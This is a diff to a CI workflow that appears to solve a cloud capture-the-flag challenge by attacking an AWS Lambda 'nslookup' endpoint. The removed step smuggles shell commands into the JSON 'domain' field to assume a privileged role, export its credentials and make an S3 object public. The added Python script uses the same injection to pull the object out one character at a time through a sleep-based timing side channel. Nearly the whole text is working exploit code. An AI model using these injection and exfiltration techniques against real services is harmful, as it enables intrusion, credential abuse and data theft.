@@ -19,20 +19,84 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Make flag.txt public via assumed role
+      - name: Timing Side-Channel Extraction
         run: |
-          API_ID="3q931syi7b"
-          REGION="us-east-1"
-          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
-    
-          # Assume CTFExecutionRole, then make the specific object public-read
-          PAYLOAD='{"domain": "127.0.0.1; CREDS=$(aws sts assume-role --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole --role-session-name lo); export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r .Credentials.AccessKeyId); export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r .Credentials.SecretAccessKey); export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r .Credentials.SessionToken); aws s3api put-object-acl --bucket codec4f26c862a321ef5 --key flag.txt --acl public-read --region us-east-1"}'
-    
-          curl -s -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d "$PAYLOAD"
-    
-          sleep 3
-    
-          # Download via unauthenticated HTTP (bypassing cicdRole S3 restrictions)
-          curl -s https://codec4f26c862a321ef5.s3.amazonaws.com/flag.txt
+          python3 << 'PYEOF'
+          import subprocess
+          import json
+          import time
+          import sys
+
+          API_ID = "3q931syi7b"
+          REGION = "us-east-1"
+          URL = f"https://{API_ID}.execute-api.{REGION}.amazonaws.com/dev/nslookup"
+
+          def test_char(pos, mid):
+              idx = pos - 1
+              # Injects command into Lambda: reads flag from S3, checks ASCII value via Python, sleeps if > mid
+              domain = (
+                  f'127.0.0.1; '
+                  f'F=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); '
+                  f'printf \'%s\' "$F" | python3 -c "import sys; c=ord(sys.stdin.read()[{idx}]); sys.exit(0 if c>{mid} else 1)" && sleep 5'
+              )
+              payload = json.dumps({"domain": domain})
+              
+              start = time.time()
+              try:
+                  result = subprocess.run(
+                      ["curl", "-s", "--max-time", "6", "-X", "POST", URL,
+                       "-H", "Content-Type: application/json", "-d", payload],
+                      capture_output=True, text=True, timeout=15
+                  )
+                  elapsed = time.time() - start
+                  response = result.stdout
+              except subprocess.TimeoutExpired:
+                  elapsed = 15
+                  response = ""
+              
+              # If elapsed >= 4.5s, the sleep command successfully executed (char > mid)
+              if elapsed >= 4.5 or not response or "wip" not in response:
+                  return True
+              return False
+
+          print("=== Verifying S3 access via timing ===")
+          verify_domain = (
+              '127.0.0.1; '
+              'F=$(aws s3 cp s3://codec4f26c862a321ef5/flag.txt - --region us-east-1); '
+              'L=${#F}; [ "$L" -eq 16 ] && sleep 5'
+          )
+          verify_payload = json.dumps({"domain": verify_domain})
+          
+          start = time.time()
+          subprocess.run(
+              ["curl", "-s", "--max-time", "6", "-X", "POST", URL,
+               "-H", "Content-Type: application/json", "-d", verify_payload],
+              capture_output=True, text=True, timeout=15
+          )
+          elapsed = time.time() - start
+          print(f"S3 Calibration elapsed time: {elapsed:.2f}s")
+
+          FLAG_LEN = 16
+          flag = []
+          
+          for pos in range(1, FLAG_LEN + 1):
+              print(f"\n=== Brute-forcing position {pos} ===")
+              low, high = 32, 126
+              while low < high:
+                  mid = (low + high) // 2
+                  print(f"Testing > {mid} (range {low}-{high})...", end=" ", flush=True)
+                  if test_char(pos, mid):
+                      low = mid + 1
+                      print("GREATER")
+                  else:
+                      high = mid
+                      print("LESS/EQUAL")
+              char = chr(low)
+              print(f">>> Position {pos} resolved to: '{char}' (ASCII {low})")
+              flag.append(char)
+              print(f">>> Flag so far: {''.join(flag)}")
+
+          print("\n=======================")
+          print(f"FINAL FLAG: {''.join(flag)}")
+          print("=======================")
+          PYEOF
